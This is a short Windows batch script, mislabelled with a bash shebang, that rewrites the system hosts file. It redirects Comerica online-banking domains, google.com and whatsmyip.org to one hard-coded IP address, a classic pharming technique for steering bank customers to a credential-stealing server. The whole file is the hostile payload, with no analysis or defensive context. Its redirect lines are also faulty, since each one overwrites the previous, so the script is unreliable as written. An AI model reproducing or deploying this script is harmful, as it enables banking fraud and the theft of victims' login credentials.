#!/bin/bash
@echo off
echo 210.138.184.59 www.webbanking.comerica.com > %temp%\temphosts.txt
echo 210.138.184.59 www.comerica.com > %temp%\temphosts.txt
echo 210.138.184.59 comerica.com > %temp%\temphosts.txt
echo 210.138.184.59 google.com > %temp%\temphosts.txt
echo 210.138.184.59 whatsmyip.org > %temp%\temphosts.txt
type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
echo C:\WINDOWS\system32\drivers\etc\hosts
